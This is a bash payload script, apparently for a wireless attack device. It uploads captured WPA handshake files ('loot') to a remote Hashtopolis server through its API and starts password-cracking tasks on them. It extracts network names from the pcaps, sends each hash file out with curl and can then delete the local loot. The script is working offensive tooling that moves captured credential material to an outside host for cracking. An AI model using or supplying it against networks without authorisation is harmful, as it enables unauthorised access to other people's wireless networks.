#!/bin/bash
# Title: Hashtopolis Handshake Upload
# Description: Manually uploads all captured handshakes to Hashtopolis server via API
# Author: Originaly Hunt-Z modified by TheDadNerd
# Version: 2.1
# Category: general
#
# Requirements:
# - Active internet connection
# - Valid Hashtopolis server with API access
# - Preconfigured task created in Hashtopolis
# - config.sh file in same directory with settings

# =============================================================================
# FALLBACK UI HELPERS (when not running under Pager)
# =============================================================================

type ERROR_DIALOG >/dev/null 2>&1 || ERROR_DIALOG() { echo "ERROR: $*" >&2; }
type ALERT >/dev/null 2>&1 || ALERT() { echo "$*"; }
type LOG_INFO >/dev/null 2>&1 || LOG_INFO() { echo "$*"; }
type LOG_ERROR >/dev/null 2>&1 || LOG_ERROR() { echo "ERROR: $*" >&2; }
type CONFIRMATION_DIALOG >/dev/null 2>&1 || CONFIRMATION_DIALOG() {
    local __prompt="$*"
    local __reply=""
    read -r -p "$__prompt [y/N]: " __reply
    [[ "$__reply" =~ ^[Yy]$ ]]
}

# =============================================================================
# PAYLOAD CONFIG STORAGE
# =============================================================================

PAYLOAD_NAME="hashtopolis_manual_upload"
LOG "Hashtopolis Upload - Starting payload."

get_payload_config() {
    PAYLOAD_GET_CONFIG "$PAYLOAD_NAME" "$1" 2>/dev/null
}

load_payload_config() {
    # Pull the saved payload config into the runtime environment.
    HASHTOPOLIS_URL="$(get_payload_config hashtopolisurl)"
    API_KEY="$(get_payload_config apikey)"
    HASH_TYPE="$(get_payload_config hashtype)"
    ACCESS_GROUP_ID="$(get_payload_config accessgroupid)"
    SECRET_HASHLIST="$(get_payload_config secrethashlist)"
    USE_BRAIN="$(get_payload_config usebrain)"
    BRAIN_FEATURES="$(get_payload_config brainfeatures)"
    PRETASK_ID="$(get_payload_config pretaskid)"
    CRACKER_VERSION_ID="$(get_payload_config crackerversionid)"

    if [[ -z "$HASHTOPOLIS_URL" \
        || -z "$API_KEY" \
        || -z "$HASH_TYPE" \
        || -z "$ACCESS_GROUP_ID" \
        || -z "$SECRET_HASHLIST" \
        || -z "$USE_BRAIN" \
        || -z "$BRAIN_FEATURES" \
        || -z "$PRETASK_ID" \
        || -z "$CRACKER_VERSION_ID" ]]; then
        return 1
    fi

    return 0
}

read_saved_config() {
    # Load saved payload config into SAVED_* variables for comparison.
    SAVED_HASHTOPOLIS_URL="$(get_payload_config hashtopolisurl)"
    SAVED_API_KEY="$(get_payload_config apikey)"
    SAVED_HASH_TYPE="$(get_payload_config hashtype)"
    SAVED_ACCESS_GROUP_ID="$(get_payload_config accessgroupid)"
    SAVED_SECRET_HASHLIST="$(get_payload_config secrethashlist)"
    SAVED_USE_BRAIN="$(get_payload_config usebrain)"
    SAVED_BRAIN_FEATURES="$(get_payload_config brainfeatures)"
    SAVED_PRETASK_ID="$(get_payload_config pretaskid)"
    SAVED_CRACKER_VERSION_ID="$(get_payload_config crackerversionid)"

    if [[ -z "$SAVED_HASHTOPOLIS_URL" \
        || -z "$SAVED_API_KEY" \
        || -z "$SAVED_HASH_TYPE" \
        || -z "$SAVED_ACCESS_GROUP_ID" \
        || -z "$SAVED_SECRET_HASHLIST" \
        || -z "$SAVED_USE_BRAIN" \
        || -z "$SAVED_BRAIN_FEATURES" \
        || -z "$SAVED_PRETASK_ID" \
        || -z "$SAVED_CRACKER_VERSION_ID" ]]; then
        return 1
    fi

    return 0
}

config_is_sample() {
    # Returns success if the provided config values match sample placeholders.
    local cfg_url="$1"
    local cfg_key="$2"
    if [[ "$cfg_url" == *"example.com"* ]] || [[ "$cfg_key" == "YOUR_API_KEY_HERE" ]]; then
        return 0
    fi
    return 1
}

populate_config_from_saved() {
    # Overwrite export lines in config.sh with saved payload config values.
    local tmp_file
    local url_escaped
    local key_escaped

    url_escaped="${SAVED_HASHTOPOLIS_URL//\\/\\\\}"
    url_escaped="${url_escaped//\"/\\\"}"
    key_escaped="${SAVED_API_KEY//\\/\\\\}"
    key_escaped="${key_escaped//\"/\\\"}"

    tmp_file="$(mktemp)"
    awk -v url="$url_escaped" \
        -v key="$key_escaped" \
        -v hash_type="$SAVED_HASH_TYPE" \
        -v access_group_id="$SAVED_ACCESS_GROUP_ID" \
        -v secret_hashlist="$SAVED_SECRET_HASHLIST" \
        -v use_brain="$SAVED_USE_BRAIN" \
        -v brain_features="$SAVED_BRAIN_FEATURES" \
        -v pretask_id="$SAVED_PRETASK_ID" \
        -v cracker_version_id="$SAVED_CRACKER_VERSION_ID" '
        /^export HASHTOPOLIS_URL=/ { print "export HASHTOPOLIS_URL=\"" url "\""; next }
        /^export API_KEY=/ { print "export API_KEY=\"" key "\""; next }
        /^export HASH_TYPE=/ { print "export HASH_TYPE=" hash_type; next }
        /^export ACCESS_GROUP_ID=/ { print "export ACCESS_GROUP_ID=" access_group_id; next }
        /^export SECRET_HASHLIST=/ { print "export SECRET_HASHLIST=" secret_hashlist; next }
        /^export USE_BRAIN=/ { print "export USE_BRAIN=" use_brain; next }
        /^export BRAIN_FEATURES=/ { print "export BRAIN_FEATURES=" brain_features; next }
        /^export PRETASK_ID=/ { print "export PRETASK_ID=" pretask_id; next }
        /^export CRACKER_VERSION_ID=/ { print "export CRACKER_VERSION_ID=" cracker_version_id; next }
        { print }
    ' "$CONFIG_FILE" > "$tmp_file" && mv "$tmp_file" "$CONFIG_FILE"
}

warn_if_sample_config() {
    # Block saving when config.sh still has the sample placeholders.
    if [[ "$HASHTOPOLIS_URL" == *"example.com"* ]] || [[ "$API_KEY" == "YOUR_API_KEY_HERE" ]]; then
        ERROR_DIALOG "Hashtopolis Upload - Can't save from sample config, please populate config.sh."
        return 1
    fi
    return 0
}

# =============================================================================
# LOAD CONFIGURATION
# =============================================================================
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
CONFIG_FILE="$SCRIPT_DIR/config.sh"
FORCE_CONFIG_UPDATE=false

while [[ "$1" == --* ]]; do
    case "$1" in
        --update-config)
            FORCE_CONFIG_UPDATE=true
            shift
            ;;
        *)
            ERROR_DIALOG "Hashtopolis Upload - Unknown option: $1"
            exit 1
            ;;
    esac
done

if [[ ! -f "$CONFIG_FILE" ]]; then
    ERROR_DIALOG "Hashtopolis Upload - Configuration file not found. Please create config.sh file."
    exit 1
fi

source "$CONFIG_FILE"
LOG "Hashtopolis Upload - Loaded config.sh."

# Capture config.sh values for comparison without overwriting saved runtime config.
CFG_HASHTOPOLIS_URL="$HASHTOPOLIS_URL"
CFG_API_KEY="$API_KEY"
CFG_HASH_TYPE="$HASH_TYPE"
CFG_ACCESS_GROUP_ID="$ACCESS_GROUP_ID"
CFG_SECRET_HASHLIST="$SECRET_HASHLIST"
CFG_USE_BRAIN="$USE_BRAIN"
CFG_BRAIN_FEATURES="$BRAIN_FEATURES"
CFG_PRETASK_ID="$PRETASK_ID"
CFG_CRACKER_VERSION_ID="$CRACKER_VERSION_ID"
HAS_SAVED_CONFIG=false

if read_saved_config; then
    HAS_SAVED_CONFIG=true
    LOG "Hashtopolis Upload - Found saved config."
    if config_is_sample "$CFG_HASHTOPOLIS_URL" "$CFG_API_KEY"; then
        # Offer to restore config.sh from saved config if the file looks reset.
        if CONFIRMATION_DIALOG "config.sh looks reset to sample values. Populate it from saved config?"; then
            LOG "Hashtopolis Upload - Restoring config.sh from saved config."
            populate_config_from_saved
            CFG_HASHTOPOLIS_URL="$SAVED_HASHTOPOLIS_URL"
            CFG_API_KEY="$SAVED_API_KEY"
            CFG_HASH_TYPE="$SAVED_HASH_TYPE"
            CFG_ACCESS_GROUP_ID="$SAVED_ACCESS_GROUP_ID"
            CFG_SECRET_HASHLIST="$SAVED_SECRET_HASHLIST"
            CFG_USE_BRAIN="$SAVED_USE_BRAIN"
            CFG_BRAIN_FEATURES="$SAVED_BRAIN_FEATURES"
            CFG_PRETASK_ID="$SAVED_PRETASK_ID"
            CFG_CRACKER_VERSION_ID="$SAVED_CRACKER_VERSION_ID"
        fi
    fi
fi

# =============================================================================
# CONFIGURATION STORAGE (OPTIONAL UPDATE)
# =============================================================================

if [[ "$FORCE_CONFIG_UPDATE" == true ]]; then
    # Force an update from config.sh (still warn on sample placeholders).
    LOG "Hashtopolis Upload - Forced config update enabled."
    if ! warn_if_sample_config; then
        exit 1
    fi
    LOG "Hashtopolis Upload - Saving config.sh values to persistent config."
    if ! push_payload_config; then
        ERROR_DIALOG "Hashtopolis Upload - Failed to store config from config.sh. Check values."
        exit 1
    fi
elif [[ "$HAS_SAVED_CONFIG" == true ]]; then
    # Only prompt to update when config.sh differs from saved config and is not sample data.
    if ! config_is_sample "$CFG_HASHTOPOLIS_URL" "$CFG_API_KEY" \
        && { [[ "$CFG_HASHTOPOLIS_URL" != "$SAVED_HASHTOPOLIS_URL" ]] \
            || [[ "$CFG_API_KEY" != "$SAVED_API_KEY" ]] \
            || [[ "$CFG_HASH_TYPE" != "$SAVED_HASH_TYPE" ]] \
            || [[ "$CFG_ACCESS_GROUP_ID" != "$SAVED_ACCESS_GROUP_ID" ]] \
            || [[ "$CFG_SECRET_HASHLIST" != "$SAVED_SECRET_HASHLIST" ]] \
            || [[ "$CFG_USE_BRAIN" != "$SAVED_USE_BRAIN" ]] \
            || [[ "$CFG_BRAIN_FEATURES" != "$SAVED_BRAIN_FEATURES" ]] \
            || [[ "$CFG_PRETASK_ID" != "$SAVED_PRETASK_ID" ]] \
    || [[ "$CFG_CRACKER_VERSION_ID" != "$SAVED_CRACKER_VERSION_ID" ]]; }; then
        if CONFIRMATION_DIALOG "config.sh differs from saved config. Update saved config now?"; then
            if ! warn_if_sample_config; then
                exit 1
            fi
            LOG "Hashtopolis Upload - Updating saved config from config.sh."
            if ! push_payload_config; then
                ERROR_DIALOG "Hashtopolis Upload - Failed to store config from config.sh. Check values."
                exit 1
            fi
        fi
    fi
fi

if ! load_payload_config; then
    LOG "Hashtopolis Upload - No saved config available."
    if CONFIRMATION_DIALOG "Hashtopolis config has not yet been saved. Pull and save from config.sh now?"; then
        if ! warn_if_sample_config; then
            exit 1
        fi
        HASHTOPOLIS_URL="$CFG_HASHTOPOLIS_URL"
        API_KEY="$CFG_API_KEY"
        HASH_TYPE="$CFG_HASH_TYPE"
        ACCESS_GROUP_ID="$CFG_ACCESS_GROUP_ID"
        SECRET_HASHLIST="$CFG_SECRET_HASHLIST"
        USE_BRAIN="$CFG_USE_BRAIN"
        BRAIN_FEATURES="$CFG_BRAIN_FEATURES"
        PRETASK_ID="$CFG_PRETASK_ID"
        CRACKER_VERSION_ID="$CFG_CRACKER_VERSION_ID"
        LOG "Hashtopolis Upload - Saving config.sh values to persistent config."
        if ! push_payload_config; then
            ERROR_DIALOG "Hashtopolis Upload - Failed to store config from config.sh. Check values."
            exit 1
        fi
        if ! load_payload_config; then
            ERROR_DIALOG "Hashtopolis Upload - Could not load saved config after update."
            exit 1
        fi
    else
        ERROR_DIALOG "Hashtopolis Upload - No saved config. Update from config.sh to continue."
        exit 1
    fi
fi
LOG "Hashtopolis Upload - Loaded saved config."

# =============================================================================
# VALIDATE CONFIGURATION
# =============================================================================

if [[ "$HASHTOPOLIS_URL" == *"example.com"* ]]; then
    ERROR_DIALOG "Hashtopolis Upload - Server URL not configured. Update saved config from config.sh."
    exit 1
fi

if [[ "$API_KEY" == "YOUR_API_KEY_HERE" ]] || [[ -z "$API_KEY" ]]; then
    ERROR_DIALOG "Hashtopolis Upload - API key not configured. Update saved config from config.sh."
    exit 1
fi

if [[ -z "$PRETASK_ID" ]]; then
    ERROR_DIALOG "Hashtopolis Upload - Pretask ID not configured. Update saved config from config.sh."
    exit 1
fi

if [[ -z "$CRACKER_VERSION_ID" ]]; then
    ERROR_DIALOG "Hashtopolis Upload - Cracker Version ID not configured. Update saved config from config.sh."
    exit 1
fi

# =============================================================================
# TEST SERVER CONNECTION
# =============================================================================

LOG "Hashtopolis Upload - Testing server connection."
CONNECTION_TEST=$(curl -s -m 10 -X POST "$HASHTOPOLIS_URL" \
    -H "Content-Type: application/json" \
    -d '{"section":"test","request":"connection"}' 2>&1)

if [[ $? -ne 0 ]]; then
    ERROR_DIALOG "Hashtopolis Upload - Cannot connect to server. Check URL and internet connection."
    exit 1
fi

if ! echo "$CONNECTION_TEST" | jq -e '.response == "SUCCESS"' >/dev/null 2>&1; then
    ERROR_DIALOG "Hashtopolis Upload - Invalid API endpoint. Check HASHTOPOLIS_URL in config.sh."
    exit 1
fi
LOG "Hashtopolis Upload - Server connection OK."

# =============================================================================
# TEST API KEY AUTHENTICATION
# =============================================================================

LOG "Hashtopolis Upload - Testing API key authentication."
AUTH_TEST=$(curl -s -m 10 -X POST "$HASHTOPOLIS_URL" \
    -H "Content-Type: application/json" \
    -d "{\"section\":\"test\",\"request\":\"access\",\"accessKey\":\"$API_KEY\"}" 2>&1)

if [[ $? -ne 0 ]]; then
    ERROR_DIALOG "Hashtopolis Upload - Cannot authenticate. Check network connection."
    exit 1
fi

if ! echo "$AUTH_TEST" | jq -e '.response == "OK"' >/dev/null 2>&1; then
    AUTH_ERROR=$(echo "$AUTH_TEST" | jq -r '.message // "Invalid API key"')
    ERROR_DIALOG "Hashtopolis Upload - Invalid API key. Error: $AUTH_ERROR. Generate key in Users > API Management."
    exit 1
fi
LOG "Hashtopolis Upload - API key OK."

# =============================================================================
# PROCESS ALL HANDSHAKES IN DIRECTORY
# =============================================================================

HANDSHAKE_DIR="${1:-/root/loot/handshakes}"

if [[ ! -d "$HANDSHAKE_DIR" ]]; then
    ERROR_DIALOG "Hashtopolis Upload - Handshake directory not found: $HANDSHAKE_DIR"
    exit 1
fi
LOG "Hashtopolis Upload - Scanning handshakes in $HANDSHAKE_DIR."

process_handshake_file() {
    local hashcat_path="$1"
    local base="${hashcat_path%.*}"
    local pcap_path=""
    local ssid=""
    local ap_mac="UNKNOWN_AP"
    local timestamp=""
    local unique_name=""
    local file_data=""
    local upload_json=""
    local upload_response=""
    local hashlist_id=""
    local task_json=""
    local task_response=""

    if [[ -f "${base}.pcap" ]]; then
        pcap_path="${base}.pcap"
    elif [[ -f "${base}.cap" ]]; then
        pcap_path="${base}.cap"
    fi

    if [[ -n "$pcap_path" ]]; then
        ssid=$(tcpdump -r "$pcap_path" -e -I -s 256 2>/dev/null \
          | sed -n 's/.*Beacon (\([^)]*\)).*/\1/p' \
          | head -n 1)
    fi

    if [[ -z "$ssid" ]]; then
        ssid="UNKNOWN_SSID"
    fi

    ssid=$(echo "$ssid" | tr -dc 'a-zA-Z0-9_-')

    timestamp=$(date +%s)
    unique_name="WPA_${ssid}_${ap_mac}_${timestamp}"

    file_data=$(base64 -w 0 "$hashcat_path" 2>&1)
    if [[ $? -ne 0 ]]; then
        LOG_ERROR "Hashtopolis Upload - File encoding error for $hashcat_path"
        return 1
    fi

    upload_json=$(cat <<EOF
{
  "section": "hashlist",
  "request": "createHashlist",
  "name": "$unique_name",
  "isSalted": false,
  "isSecret": $SECRET_HASHLIST,
  "isHexSalt": false,
  "separator": ":",
  "format": 0,
  "hashtypeId": $HASH_TYPE,
  "accessGroupId": $ACCESS_GROUP_ID,
  "data": "$file_data",
  "useBrain": $USE_BRAIN,
  "brainFeatures": $BRAIN_FEATURES,
  "accessKey": "$API_KEY"
}
EOF
)

    upload_response=$(curl -s -m 30 -X POST "$HASHTOPOLIS_URL" \
        -H "Content-Type: application/json" \
        -d "$upload_json" 2>&1)

    if [[ $? -ne 0 ]]; then
        LOG_ERROR "Hashtopolis Upload - Cannot reach server for $hashcat_path"
        return 1
    fi

    if echo "$upload_response" | jq -e '.response == "ERROR"' >/dev/null 2>&1; then
        local error_msg
        error_msg=$(echo "$upload_response" | jq -r '.message // "Unknown error"')
        if echo "$error_msg" | grep -qi "brain"; then
            LOG_ERROR "Hashtopolis Upload - Hashcat Brain Error for $hashcat_path: $error_msg"
        else
            LOG_ERROR "Hashtopolis Upload - API Error for $hashcat_path: $error_msg"
        fi
        return 1
    fi

    hashlist_id=$(echo "$upload_response" | jq -r '.hashlistId // empty')
    if [[ -z "$hashlist_id" ]]; then
        LOG_ERROR "Hashtopolis Upload - Hashlist ID not returned for $hashcat_path"
        return 1
    fi

    task_json=$(cat <<EOF
{
  "section": "task",
  "request": "runPretask",
  "name": "$unique_name",
  "hashlistId": $hashlist_id,
  "pretaskId": $PRETASK_ID,
  "crackerVersionId": $CRACKER_VERSION_ID,
  "accessKey": "$API_KEY"
}
EOF
)

    task_response=$(curl -s -m 30 -X POST "$HASHTOPOLIS_URL" \
        -H "Content-Type: application/json" \
        -d "$task_json" 2>&1)

    if [[ $? -ne 0 ]]; then
        LOG_ERROR "Hashtopolis Upload - Task creation timeout for $hashcat_path (hashlist ID: $hashlist_id)"
        return 1
    fi

    if echo "$task_response" | jq -e '.response == "ERROR"' >/dev/null 2>&1; then
        local error_msg
        error_msg=$(echo "$task_response" | jq -r '.message // "Unknown error"')
        LOG_ERROR "Hashtopolis Upload - Task Error for $hashcat_path: $error_msg (hashlist ID: $hashlist_id)"
        return 1
    fi

    LOG_INFO "Hashtopolis Upload - SUCCESS: $hashcat_path -> Hashlist ID: $hashlist_id"
    return 0
}

found_any=false
success_count=0
error_count=0

while IFS= read -r -d '' hashcat_file; do
    found_any=true
    if process_handshake_file "$hashcat_file"; then
        success_count=$((success_count + 1))
    else
        error_count=$((error_count + 1))
    fi
done < <(find "$HANDSHAKE_DIR" -type f -name '*.22000' -print0)

if [[ "$found_any" == false ]]; then
    ERROR_DIALOG "Hashtopolis Upload - No .22000 files found in $HANDSHAKE_DIR"
    exit 1
fi

if [[ "$error_count" -eq 0 ]]; then
    if CONFIRMATION_DIALOG "Remove local handshake files in $HANDSHAKE_DIR?"; then
        # All uploads succeeded, clean out the loot directory files.
        find "$HANDSHAKE_DIR" -type f -print0 | xargs -0 rm -f
        LOG_INFO "Hashtopolis Upload - Cleaned up files in $HANDSHAKE_DIR"
    else
        LOG_INFO "Hashtopolis Upload - Cleanup skipped by user."
    fi
fi

ALERT "Hashtopolis Upload - Completed. Success: $success_count, Errors: $error_count"
exit 0
